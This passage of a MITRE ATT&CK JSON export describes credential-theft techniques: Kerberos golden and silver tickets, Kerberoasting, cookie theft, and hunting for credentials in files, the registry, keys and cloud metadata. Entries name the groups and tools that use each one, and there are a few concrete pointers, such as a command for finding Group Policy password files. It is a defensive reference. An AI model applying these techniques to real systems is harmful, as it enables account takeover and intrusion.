{"id": "G0016", "name": "APT29", "description": "APT29 uses stolen tokens to access victim accounts, without needing a password."}, {"id": "S0683", "name": "Peirates", "description": "Peirates gathers Kubernetes service account tokens using a variety of techniques."}], "sub_techniques": []}, {"name": "Steal or Forge Authentication Certificates", "description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.", "detailed_description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files), misplaced certificate files (i.e. Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs. With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.\nAbusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as \"golden\" certificates). Adversaries may also target certificates and related services in order to access other forms of credentials, such as Golden Ticket ticket-granting tickets (TGT) or NTLM plaintext.", "id": "T1649", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can create and export various authentication certificates, including those associated with Azure AD joined/registered devices."}, {"id": "G0016", "name": "APT29", "description": "APT29 has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's CRYPTO module can create and export various types of authentication certificates."}], "sub_techniques": []}, {"name": "Steal or Forge Kerberos Tickets", "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.", "detailed_description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\nOn Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.", "id": "T1558", "examples": [], "sub_techniques": [{"name": "Golden Ticket", "description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory.", "detailed_description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory.\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.", "id": "T1558.001", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can leverage its implementation of Mimikatz to obtain and use golden tickets."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used Mimikatz to generate Kerberos golden tickets."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's kerberos module can create golden tickets."}, {"id": "S1071", "name": "Rubeus", "description": "Rubeus can forge a ticket-granting ticket."}]}, {"name": "Silver Ticket", "description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.", "detailed_description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.", "id": "T1558.002", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can be used to forge Kerberos tickets using the password hash of the AZUREADSSOACC account."}, {"id": "S0363", "name": "Empire", "description": "Empire can leverage its implementation of Mimikatz to obtain and use silver tickets."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's kerberos module can create silver tickets."}, {"id": "S1071", "name": "Rubeus", "description": "Rubeus can create silver tickets."}]}, {"name": "Kerberoasting", "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.", "detailed_description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.\nThis same behavior could be executed using service tickets captured from network traffic.\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.", "id": "T1558.003", "examples": [{"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can decode Kerberos 5 tickets and convert it to hashcat format for subsequent cracking."}, {"id": "S0363", "name": "Empire", "description": "Empire uses PowerSploit's Invoke-Kerberoast to request service tickets and return crackable ticket hashes."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used Kerberoasting PowerShell commands such as, Invoke-Kerberoast for credential access and to enable lateral movement."}, {"id": "S0357", "name": "Impacket", "description": "Impacket modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has conducted Kerberoasting attacks using a module from GitHub."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used PowerSploit's Invoke-Kerberoast module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Invoke-Kerberoast module can request service tickets and return crackable ticket hashes."}, {"id": "S1071", "name": "Rubeus", "description": "Rubeus can use the KerberosRequestorSecurityToken.GetRequest method to request kerberoastable service tickets."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY contains a module to conduct Kerberoasting."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes."}]}, {"name": "AS-REP Roasting", "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages.", "detailed_description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages.\nPreauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.", "id": "T1558.004", "examples": [{"id": "S1071", "name": "Rubeus", "description": "Rubeus can reveal the credentials of accounts that have Kerberos pre-authentication disabled through AS-REP roasting."}]}, {"name": "Ccache Files", "description": "Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials.", "detailed_description": "Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials.\nThe /etc/krb5.conf configuration file and the KRB5CCNAME environment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the /tmp directory with a naming format of krb5cc_%UID% or krb5.ccache. On macOS, ccache entries are stored by default in memory with an API:{uuid} naming scheme. Typically, users interact with ticket storage using kinit, which obtains a Ticket-Granting-Ticket (TGT) for the principal; klist, which lists obtained tickets currently held in the credentials cache; and other built-in binaries.\nAdversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to perform Pass the Ticket attacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to perform Privilege Escalation. Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for further Lateral Movement. On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs.", "id": "T1558.005", "examples": [{"id": "S0357", "name": "Impacket", "description": "Impacket tools \u2013 such as getST.py or ticketer.py \u2013 can be used to steal or forge Kerberos tickets using ccache files given a password, hash, aesKey, or TGT."}]}]}, {"name": "Steal Web Session Cookie", "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.", "detailed_description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.\nThere are several examples of malware targeting cookies from web browsers on the local system. Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on User Execution by tricking victims into running malicious JavaScript in their browser.\nThere are also open source frameworks such as Evilginx2 and Muraena that can gather session cookies through a malicious proxy (e.g., Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns.\nAfter an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application.", "id": "T1539", "examples": [{"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used a script that extracts the web session cookie and sends it to the C2 server."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner can steal Google Chrome and Apple Safari browser cookies from the victim\u2019s machine. "}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can harvest cookies and upload them to the C2 server."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum can steal cookies and session information from browsers."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can steal the victim's cookies to use for duplicating the active session from another device."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used an unnamed post-exploitation tool to steal cookies from the Chrome browser."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules that can steal cookies from Firefox, Chrome, and Edge web browsers."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to capture web session cookies."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer attempts to steal cookies and related information in browser history."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team used information stealer malware to collect browser session cookies."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider retrieves browser cookies via Raccoon Stealer."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users."}, {"id": "S1140", "name": "Spica", "description": "Spica has the ability to steal cookies from Chrome, Firefox, Opera, and Edge browsers."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used EvilGinx to steal the session cookies of victims directed to phishing domains."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses scp to access the ~/Library/Cookies/Cookies.binarycookies file."}], "sub_techniques": []}, {"name": "Unsecured Credentials", "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry),  or other specialized files/artifacts (e.g. Private Keys).", "detailed_description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry),  or other specialized files/artifacts (e.g. Private Keys).", "id": "T1552", "examples": [{"id": "S0373", "name": "Astaroth", "description": "Astaroth uses an external software known as NetPass to recover passwords. "}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses NirSoft tools to steal user credentials from the infected machine. NirSoft tools are executed via process hollowing in a newly-created instance of vbc.exe or regasm.exe."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY captures credentials by recording them through an alternative network listener registered to the mpnotify.exe process, allowing for cleartext recording of logon information."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has obtained credentials insecurely stored on targeted network appliances."}], "sub_techniques": [{"name": "Credentials In Files", "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.", "detailed_description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.", "id": "T1552.001", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can gather unsecured credentials for Azure AD services, such as Azure AD Connect, from a local machine."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the ability to extract credentials from configuration or support files."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used a variety of publicly available tools like LaZagne to gather credentials."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can steal credentials in files belonging to common software such as Skype, Telegram, and Steam."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Outlook, and Windows Credential Store."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has dumped configuration settings in accessed IP cameras including plaintext credentials."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. "}, {"id": "S0363", "name": "Empire", "description": "Empire can use various modules to search for files containing passwords."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has obtained administrative credentials by browsing through local files on a compromised machine."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has accessed files to gain valid credentials."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has searched for SSH keys, Docker credentials, and Kubernetes service tokens."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has searched files to obtain and exfiltrate credentials."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can capture passwords from common chat applications such as MSN Messenger, AOL, Instant Messenger, and and Google Talk."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used tools that are capable of obtaining credentials from saved mail."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can obtain credentials from chats, databases, mail, and WiFi."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used several tools for retrieving login and password information, including LaZagne."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has run a tool that steals passwords saved in victim email."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access."}, {"id": "S0067", "name": "pngdowner", "description": "If an initial connectivity check fails, pngdowner attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains modules for searching for passwords in local and remote files."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use Lazagne for harvesting credentials."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has extracted credentials from the password database before encrypting the files."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can obtain passwords from FTP clients."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl used LaZagne to obtain passwords in files."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider Spider searches for credential storage documentation on a compromised host."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader searches for files named logins.json to parse for credentials."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used malware to gather credentials from FTP clients and Outlook."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has searched for unsecured AWS credentials and Docker API credentials."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the \".vnc.lnk\" affix to steal VNC credentials."}, {"id": "S0117", "name": "XTunnel", "description": "XTunnel is capable of accessing locally stored passwords on victims."}]}, {"name": "Credentials in Registry", "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.", "detailed_description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\nExample commands to find Registry keys related to password information:", "id": "T1552.002", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the ability to extract credentials from the Registry."}, {"id": "G0050", "name": "APT32", "description": "APT32 used Outlook Credential Dumper to harvest credentials stored in Windows registry."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can harvest credentials from local and remote host registries."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit has several modules that search the Windows Registry for stored credentials: Get-UnattendedInstallFile, Get-Webconfig, Get-ApplicationHost, Get-SiteListPassword, Get-CachedGPPPassword, and Get-RegistryAutoLogon."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl used LaZagne to obtain passwords in the Registry."}, {"id": "S0075", "name": "Reg", "description": "Reg may be used to find credentials in the Windows Registry."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has retrieved PuTTY credentials by querying the Software\\SimonTatham\\Putty\\Sessions registry key "}, {"id": "S0476", "name": "Valak", "description": "Valak can use the clientgrabber module to steal e-mail credentials from the Registry."}]}, {"name": "Bash History", "description": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. ", "detailed_description": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. ", "id": "T1552.003", "examples": [{"id": "S0599", "name": "Kinsing", "description": "Kinsing has searched bash_history for credentials."}]}, {"name": "Private Keys", "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.", "detailed_description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.\nAdversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:\\Users\\(username)\\.ssh\\ on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\nOn network devices, private keys may be exported via Network Device CLI commands such as crypto pki export.\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.", "id": "T1552.004", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can gather encryption keys from Azure AD services such as ADSync and Active Directory Federated Services servers."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has intercepted unencrypted private keys as well as private key pass-phrases."}, {"id": "S0363", "name": "Empire", "description": "Empire can use modules like Invoke-SessionGopher to extract private key and session information."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can retrieve token signing certificates and token decryption certificates from a compromised AD FS server."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has searched for private keys in .ssh."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can steal keys for VPNs and cryptocurrency wallets."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has searched for private keys."}, {"id": "S0409", "name": "Machete", "description": "Machete has scanned and looked for cryptographic keys and certificate file extensions."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can collect a Chrome encryption key used to protect browser cookies."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used Mimikatz to dump certificates and private keys from the Windows certificate store."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has used SSH private keys on the infected machine to spread its coinminer throughout a network."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider enumerate and exfiltrate code-signing certificates from a compromised host."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has searched for unsecured SSH keys."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has accessed a Local State file that contains the AES key used to encrypt passwords stored in the Chrome browser."}]}, {"name": "Cloud Instance Metadata API", "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.", "detailed_description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.\nThe de facto standard across cloud service providers is to host the Instance Metadata API at http[:]//169.254.169.254.", "id": "T1552.005", "examples": [{"id": "S0601", "name": "Hildegard", "description": "Hildegard has queried the Cloud Instance Metadata API for cloud credentials."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can query the query AWS and GCP metadata APIs for secrets."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has queried the AWS instance metadata service for credentials."}]}, {"name": "Group Policy Preferences", "description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.", "detailed_description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml", "id": "T1552.006", "examples": [{"id": "G0064", "name": "APT33", "description": "APT33 has used a variety of publicly available tools like Gpppassword to gather credentials."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY has a module that can extract cached GPP passwords."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used PowerShell cmdlets Get-GPPPassword and Find-GPOPassword to find unsecured credentials in a compromised network group policy."}]}, {"name": "Container API", "description": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.", "detailed_description": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.", "id": "T1552.007", "examples": [{"id": "S0683", "name": "Peirates", "description": "Peirates can query the Kubernetes API for secrets."}]}, {"name": "Chat Messages", "description": "Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.", "detailed_description": "Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\nRather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation .", "id": "T1552.008", "examples": [{"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement."}]}]}]}, {"name": "Discovery", "description": "The adversary is trying to figure out your environment.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. 